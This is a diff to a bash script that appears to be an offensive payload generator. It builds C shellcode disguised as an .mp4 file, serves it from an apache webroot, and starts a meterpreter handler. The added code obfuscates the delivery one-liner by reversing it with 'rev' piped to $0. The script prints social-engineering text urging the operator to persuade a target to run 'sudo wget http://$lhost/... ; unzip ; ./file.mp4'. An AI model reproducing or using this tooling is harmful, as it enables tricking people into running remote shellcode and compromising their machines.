@@ -14,7 +14,7 @@
 # --------------------------------------------------------------
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 40 92 > /dev/null
+resize -s 40 105 > /dev/null
 
 
 
@@ -8245,7 +8245,7 @@ echo "[☠] Compile C program (MITRE ATT&CK T1036) .." && sleep 1
 gcc -fno-stack-protector -z execstack $IPATH/output/$mP4.c -o $IPATH/output/$mP4.mp4
 echo "[☠] Give execution permitions to agent .." && sleep 1
 chmod +x $IPATH/output/$mP4.mp4 > /dev/null 2>&1
-echo "[☠] Port all files to apache2 webroot .." && sleep 2
+echo "[☠] Porting all files to apache2 webroot .." && sleep 2
 zip $mP4.zip $mP4.mp4 > /dev/null 2>&1
 cp $IPATH/output/$mP4.mp4 $ApAcHe/$mP4.mp4 > /dev/null 2>&1
 cp $IPATH/output/$mP4.zip $ApAcHe/$mP4.zip > /dev/null 2>&1
@@ -8259,14 +8259,23 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
 if [ "$serv" = "multi-handler (default)" ]; then
 
+   original_string="sudo ./$mP4.mp4"
+   ## Read the next setting from venom-main setting file .
+   ovni=$(cat $IPATH/settings|grep -m 1 'FORCE_OBFUSC'|cut -d '=' -f2)
+   if [ "$ovni" = "ON" ]; then
+      xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
+      reverse_original=`cat /tmp/reverse.txt`;rm /tmp/reverse.txt
+      original_string="rev <<< \"$reverse_original\"|\$0"
+   fi
+
    ## Print on terminal
-   echo "";echo "SOCIAL_ENGINEERING:"
-   echo "Persuade the target to run '$mP4.mp4' executable using their terminal."
-   echo "That will remote download/exec (LAN) our mp4 video file and auto executes"
-   echo "our C shellcode in an orphan process (deatch from mp4 video process)."
-   echo "REMARK: All files required by this module have been ported to apache2."
-   echo "";echo "MANUAL_EXECUTION:"
-   echo "sudo ./$mP4.mp4";echo ""
+   echo "---";echo "-  ${YellowF}SOCIAL_ENGINEERING:"${Reset};
+   echo "-  Persuade the target to run '$mP4.mp4' executable using their terminal."
+   echo "-  That will remote download/exec (LAN) our mp4 video file and auto executes"
+   echo "-  our C shellcode in an orphan process (deatch from mp4 video process)."
+   echo "-  REMARK: All files required by this module have been ported to apache2."
+   echo "-";echo "-  ${YellowF}MANUAL_EXECUTION:"${Reset};
+   echo "-  $original_string";echo "---"
    echo -n "[☠] Press any key to start a handler .."
    read odf
    echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
@@ -8284,17 +8293,22 @@ else
    original_string="sudo wget http://$lhost/$mP4.zip;unzip $mP4.zip;./$mP4.mp4"
    xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
    reverse_original=`cat /tmp/reverse.txt`;rm -f /tmp/reverse.txt
+   ## Read the next setting from venom-main setting file .
+   ovni=$(cat $IPATH/settings|grep -m 1 'FORCE_OBFUSC'|cut -d '=' -f2)
+   if [ "$ovni" = "ON" ]; then
+      original_string="sudo wget http://$lhost/$mP4.zip;h=.;unzip $mP4.zip;\$h/$mP4.mp4"
+   fi
    
    ## Print on terminal
-   echo "";echo "SOCIAL_ENGINEERING:"
-   echo "Persuade the target to run the 'oneliner' OR the 'oneliner_obfuscated' command"
-   echo "on their terminal. That will remote download/exec (LAN) our mp4 video file and"
-   echo "auto executes our C shellcode in an orphan process (deatch from mp4 video process)."
-   echo "";echo "ONELINER:"
-   echo "$original_string";echo ""
-   echo "ONELINER_OBFUSCATED:"
-   echo "echo Streaming:$mP4.mp4;rev <<< \"$reverse_original\"|\$0"
-   echo ""
+   echo "---";echo "-  ${YellowF}SOCIAL_ENGINEERING:"${Reset};
+   echo "-  Persuade the target to run the 'oneliner' OR the 'oneliner_obfuscated' command"
+   echo "-  on their terminal. That will remote download/exec (LAN) our mp4 video file and"
+   echo "-  auto executes our C shellcode in an orphan process (deatch from mp4 video process)."
+   echo "-";echo "-  ${YellowF}ONELINER:"${Reset};
+   echo "-  $original_string";echo "-"
+   echo "-  ${YellowF}ONELINER_OBFUSCATED:"${Reset};
+   echo "-  rev <<< \"$reverse_original\"|\$0"
+   echo "---"
    echo -n "[☠] Press any key to start a handler .."
    read odf
    echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
